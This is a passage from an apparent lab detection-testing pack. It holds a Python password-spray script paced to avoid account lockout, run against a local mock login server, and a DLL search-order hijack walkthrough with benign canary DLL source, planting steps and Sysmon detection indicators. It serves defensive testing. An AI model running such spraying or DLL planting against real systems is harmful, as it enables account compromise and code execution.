            self.send_response(423); self.end_headers(); self.wfile.write(b'LOCKED'); return
        if USERS.get(u) == p:
            self.send_response(200); self.end_headers(); self.wfile.write(b'AUTH-OK')
        else:
            st['bad'] += 1
            self.send_response(401); self.end_headers(); self.wfile.write(b'AUTH-FAIL')
    def log_message(self,*a): pass

def serve():
    with socketserver.TCPServer(('127.0.0.1', 8089), H) as s: s.serve_forever()

def attempt(u,p):
    d = urllib.parse.urlencode({'user':u,'pass':p}).encode()
    try:
        return urllib.request.urlopen('http://127.0.0.1:8089/login', d).read().decode()
    except urllib.error.HTTPError as e:
        return e.read().decode()

if __name__ == '__main__':
    threading.Thread(target=serve, daemon=True).start(); time.sleep(1)
    spray_pw = 'FAKE-Spring2026!'  # one password, many users (low-and-slow)
    hits = []
    for u in USERS:
        r = attempt(u, spray_pw)
        print('spray', u, '->', r)
        if r == 'AUTH-OK': hits.append(u)
        time.sleep(0.2)  # pacing; one try/account keeps each well under LOCKOUT_THRESHOLD
    print('VALID ACCOUNTS FOUND:', hits)
    print('DETECTION: many distinct usernames, single source, in a short window -> spray signature (Win Event 4625 burst).')

IA-dll-search-order.script:
DLL SEARCH-ORDER HIJACK -- DETECTION HARNESS / REFERENCE TECHNIQUE (T1574.001) -- AUTHORIZED LAB ONLY

Goal: prove that a process loads an attacker-placed DLL from a writable directory earlier in the search
order than the legitimate one. The proof DLL is BENIGN: its DllMain only writes a canary file.

Reference build (benign proxy/proof DLL) -- on the lab VM:
  // FAKE-hijack.c  (compiles to a DLL named like one a target app loads, e.g. a non-KnownDLL)
  // BENIGN: DllMain writes a canary, then returns. No payload, no exports forwarded to malware.
  #include <windows.h>
  #include <stdio.h>
  BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID r){
      if(reason==DLL_PROCESS_ATTACH){
          FILE* f=fopen("C:\\Users\\Public\\FAKE-DLL-CANARY.txt","a");
          if(f){ fputs("FAKE-DLL loaded via search-order\n", f); fclose(f); }
      }
      return TRUE;
  }
  // build: cl /LD FAKE-hijack.c /Fe:FAKE-target.dll

Reference setup (the seam):
  1. Identify a lab app that loads 'FAKE-target.dll' by name (no absolute path, not a KnownDLL).
  2. Place the benign FAKE-target.dll in the app's own directory (searched before System32).
  3. Launch the app; observe it load the planted DLL instead of any system copy.

DETECTION HARNESS (BLUE):
  - File: C:\Users\Public\FAKE-DLL-CANARY.txt appears -> the planted DLL's DllMain ran.
  - Sysmon Event ID 7 (Image/DLL loaded): the app loads FAKE-target.dll from the app dir, with
    Signed=false / unexpected path -> classic search-order hijack indicator.
  - Sysmon Event ID 11 (FileCreate) for the planted DLL and the canary.
  - Compare load path vs expected System32 path; mismatch = confirmed hijack.

